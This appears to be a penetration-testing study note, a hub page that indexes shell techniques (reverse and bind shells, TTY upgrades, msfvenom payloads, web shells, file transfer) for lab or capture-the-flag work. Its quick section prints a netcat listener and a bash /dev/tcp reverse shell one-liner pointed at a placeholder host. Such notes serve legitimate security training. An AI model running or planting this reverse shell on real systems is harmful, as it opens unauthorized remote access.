# 🐚 Shells (Hub)

> Getting a shell, catching it, upgrading it, and moving files. Referenced from every exploitation path. This is the index — jump to the technique you need the moment you're about to land RCE.

Related: [[Linux Privilege Escalation]] · [[Windows Privilege Escalation]] · [[HTTP]] · [[Pivoting and Port Forwarding]]

---

## ⚡ THE REFLEX (on RCE)
1. **Listener up first** (`nc -lvnp 443`, LHOST = tun0, egress 443/80/53).
2. Fire a **reverse shell** → [[Reverse & Bind Shells]].
3. **Upgrade to a TTY** immediately → [[Shell Upgrade & TTY]].
4. **Pull tools / exfil loot** → [[File Transfer]].

## 🎯 TECHNIQUES (click into each)
| Technique | Note |
|---|---|
| Reverse/bind one-liners + listeners | [[Reverse & Bind Shells]] |
| Full TTY upgrade (python pty + stty) | [[Shell Upgrade & TTY]] |
| Payload files (exe/elf/php/aspx/war/msi) | [[msfvenom Payloads]] |
| Web shells (upload/LFI/OUTFILE) | [[Web Shells]] |
| Get tools on / loot off | [[File Transfer]] |

## 🔁 FOUND → NEXT (router)
| SITUATION | GO |
|---|---|
| Got a raw shell | [[Shell Upgrade & TTY]] |
| Web RCE param | [[Web Shells]] / [[Reverse & Bind Shells]] |
| Upload allowed | [[msfvenom Payloads]] (match stack) → [[Web Shells]] |
| Windows, need stability | evil-winrm / meterpreter → [[msfvenom Payloads]] |
| Need to move files | [[File Transfer]] |
| No callback | [[Reverse Shell Not Connecting]] |

## ⚠️ COMMON MISTAKES
- Listener not up before the payload · `LHOST` = LAN IP instead of **tun0** · exotic blocked port (use 443/80) · not URL-encoding web payloads · skipping the **TTY upgrade** · wrong arch/OS on msfvenom.

## 📇 QUICK
```bash
rlwrap nc -lvnp 443
```

```bash
bash -c 'bash -i >& /dev/tcp/YOURIP/443 0>&1'
```
See [[Reverse Shell Cheat Sheet]] and [[File Transfer Cheat Sheet]] for condensed one-liners.
